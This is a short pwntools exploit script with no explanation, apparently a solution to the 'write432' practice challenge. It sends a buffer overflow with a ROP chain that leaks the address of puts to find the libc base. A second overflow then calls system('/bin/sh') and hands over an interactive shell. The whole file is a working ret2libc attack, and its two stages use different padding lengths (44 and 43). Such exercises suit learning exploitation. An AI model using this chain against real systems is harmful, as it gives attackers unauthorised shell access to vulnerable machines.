from pwn import * 
context.log_level="debug"
p=process("./write432")
p.readuntil("> ")
puts=0x8048420
pr=0x080486db
libc=ELF('/lib/i386-linux-gnu/libc.so.6')
payload="D"*44+p32(puts)+p32(pr)+p32(0x804a014)+p32(0x80485F6)
gdb.attach(p)
p.send(payload.ljust(512,'\0'))
data=p.read(4)
base=u32(data)-libc.symbols['puts']
log.warning(hex(base))
libc.address=base
payload="D"*43+p32(libc.symbols['system'])+p32(0xdeadbeef)+p32(libc.search("/bin/sh").next())
p.readuntil("> ")
p.send(payload.ljust(512,'\0'))
p.interactive()
